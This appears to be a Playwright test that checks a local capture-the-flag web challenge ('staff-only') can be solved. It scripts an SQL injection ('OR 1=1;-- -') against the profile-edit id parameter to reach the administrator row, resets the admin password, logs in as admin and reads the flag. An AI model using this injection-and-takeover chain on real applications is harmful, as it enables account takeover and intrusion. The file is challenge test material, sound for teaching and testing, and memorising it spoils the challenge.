import { test, expect } from '@playwright/test'
import { READY_TIMEOUT_MS } from './timeouts'
import { exposeCarrierDecoder, type CarrierDecoder } from '../__helpers__/carrierCookies'

const BASE_URL = 'http://localhost:5173/challenge/staff-only/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
const EXPLOIT_PATH = '/profile/edit'
// The ownership guard `AND username = '<signed-in user>'` follows the injected
// id, so the payload has to comment it out — this is the book's canonical form.
const EXPLOIT_PAYLOAD = "' OR 1=1;-- -"
const ISSUED_ACCOUNT = { username: 'j.kerr', password: 'Aut2026!' }
const NEW_ADMIN_PASSWORD = 'wxl-verify-2026'

test('staff-only is solvable via /profile/edit?id=', async ({ page }) => {
  await exposeCarrierDecoder(page)
  await page.goto(BASE_URL)
  await page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: READY_TIMEOUT_MS },
  )

  const flagBody = await page.evaluate(
    async ({ editPath, payload, issued, newPassword }) => {
      const dispatch = (globalThis as unknown as {
        __wxlDispatch?: (req: Request) => Promise<Response>
      }).__wxlDispatch
      if (!dispatch) {
        throw new Error('__wxlDispatch not exposed on the page')
      }
      const base = 'https://challenge-staff-only.localhost'
      // The carrier holds base64 segments, so the raw header value is not a
      // Set-Cookie string. Decode through the shared module rather than
      // parsing it here: a second definition of the format is what let this
      // spec stop passing without anyone noticing.
      const decodeCarrier = (globalThis as unknown as {
        __wxlDecodeCarrier: CarrierDecoder
      }).__wxlDecodeCarrier
      const form = 'application/x-www-form-urlencoded'

      // X-Wxlsh-Cookie / X-Wxlsh-Set-Cookie are the forbidden-header transports
      // used by the wxl runtime (see usePythonRuntime.ts).
      const send = async (path: string, init: RequestInit & { cookie?: string }) => {
        const headers = new Headers(init.headers)
        if (init.cookie) headers.set('X-Wxlsh-Cookie', init.cookie)
        const res = await dispatch(new Request(`${base}${path}`, { ...init, headers }))
        const setCookie = await decodeCarrier(res.headers.get('x-wxlsh-set-cookie') ?? '')
        const session = setCookie.map((c) => /cb_session=([^;\s]+)/.exec(c)?.[1]).find(Boolean) ?? ''
        return { res, body: await res.text(), session }
      }

      const login = async (username: string, password: string) => {
        const { session } = await send('/login', {
          method: 'POST',
          headers: { 'content-type': form },
          body: new URLSearchParams({ username, password }).toString(),
        })
        if (!session) throw new Error(`login failed for ${username}`)
        return `cb_session=${session}`
      }

      // 1. Sign in with the account the engagement issued.
      const staffCookie = await login(issued.username, issued.password)

      // 2. Comment out the ownership guard to open the first row — the admin.
      const opened = await send(`${editPath}?id=${encodeURIComponent(payload)}`, {
        method: 'GET',
        cookie: staffCookie,
      })
      const adminUser = /\(@([^)]+)\)/.exec(opened.body)?.[1]
      if (!adminUser) throw new Error('injection did not open a profile editor')

      // 3. Set a password we know on the row the injection reached.
      await send(editPath, {
        method: 'POST',
        headers: { 'content-type': form },
        cookie: staffCookie,
        body: new URLSearchParams({
          id: payload,
          display_name: 'Dele Okafor',
          title: 'IT Administrator',
          bio: 'Keeper of the intranet.',
          password: newPassword,
        }).toString(),
      })

      // 4. Sign in as the administrator and open the console.
      const adminCookie = await login(adminUser, newPassword)
      const console_ = await send('/admin', { method: 'GET', cookie: adminCookie })
      return console_.body
    },
    {
      editPath: EXPLOIT_PATH,
      payload: EXPLOIT_PAYLOAD,
      issued: ISSUED_ACCOUNT,
      newPassword: NEW_ADMIN_PASSWORD,
    },
  )

  expect(flagBody).toMatch(FLAG_REGEX)
})
